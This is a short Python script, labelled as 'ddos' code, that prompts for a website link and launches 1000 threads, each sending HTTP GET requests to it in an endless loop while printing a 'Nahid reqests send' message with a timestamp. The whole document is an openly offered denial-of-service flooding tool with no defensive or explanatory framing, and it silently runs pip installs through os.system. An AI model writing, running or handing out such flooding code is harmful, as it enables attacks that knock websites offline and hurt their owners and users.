import os
import time

try:
    import requests
except ImportError:
    print("\033[1;31mInstalling 'requests' module...\033[0m")
    os.system('pip install requests')
    import requests

try:
    import threading
except ImportError:
    print("\033[1;31mInstalling 'threading' module...\033[0m")
    os.system('pip install threading')
    import threading
 #ddos cod
urls = input("site link: ")
os.system("clear")
def send_request():
    try:
        while True:
            response = requests.get(urls)
            print("\033[1;31m Nahid reqests send -","<"+time.asctime()+">")
    except:
        pass

def ddosTools():
    threads = []
    for _ in range(1000):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    ddosTools()